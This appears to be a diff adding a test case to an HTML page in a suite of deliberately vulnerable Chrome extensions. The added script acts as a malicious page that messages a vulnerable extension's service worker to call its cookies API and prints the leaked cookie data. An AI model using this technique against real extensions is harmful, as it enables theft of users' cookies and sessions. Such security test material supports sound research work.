@@ -92,5 +92,27 @@
 			}, 2000); // We need to wait some time here as /vuln01_weak_mv3_localStorage/content.js only checks every 500ms.
 		</script>
 
+		<br/>
+		<br/>
+		<br/>
+
+		<!-- (e) /vuln01_weak_mv3_runtime_sendMessage_dynamic_function_call1 -->
+		<span id="cookies4"></span>
+		<script>
+			// Request cookies from service worker(!):
+			setTimeout(function() {
+				let extensionId = "..."; // <== fill in extension ID here (!!!)
+				chrome.runtime.sendMessage( // A message from (malicious) page to (vulnerable) service worker
+					extensionId,
+					{api: "0"}, // "0" corresponds to the "cookies" API, cf. /vuln01_weak_mv3_runtime_sendMessage_dynamic_function_call1/background.js
+					function(response) {
+						let leaked_cookie_data = JSON.stringify(response);
+						document.getElementById('cookies4').innerText = "Leaked cookie data (received via direct message from service worker): "
+							+ leaked_cookie_data.substring(0, 1000) + " ... " + leaked_cookie_data.substring(leaked_cookie_data.length-1000);
+					}
+				);
+			}, 175);
+		</script>
+
 	</body>
 </html>
